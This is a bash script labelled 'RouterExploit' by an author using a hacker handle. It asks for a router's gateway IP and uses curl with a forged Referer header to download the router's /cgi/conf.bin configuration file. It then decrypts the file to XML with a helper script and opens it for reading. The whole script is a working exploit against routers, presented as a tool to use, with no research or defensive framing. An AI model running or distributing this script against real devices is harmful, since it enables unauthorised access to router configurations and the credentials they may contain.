#!/bin/bash

pip3 install pycryptodome
tput reset

echo
echo
echo
echo "                     +::::::::::::::::::::::::::::::::::::::::::::::::::+ "
echo "                     +                   RouterExploit                  + "
echo "                     +::::::::::::::::::::::::::::::::::::::::::::::::::+ "
echo "                     +            Exploit Router Config File            + "
echo "                     +::::::::::::::::::::::::::::::::::::::::::::::::::+ "
echo "                     +             Creator : BL4CKH47H4CK3R             + "
echo "                     +::::::::::::::::::::::::::::::::::::::::::::::::::+ "
echo
echo

read -p "[*] Enter Gateway IP (e.g. 192.168.0.1): " gateway
curl -s -k -X GET -H "Referer: http://$gateway/mainFrame.htm" http://$gateway/cgi/conf.bin > conf.bin
echo
python3 bin2xml.py conf.bin conf.xml
rm conf.bin
nano conf.xml
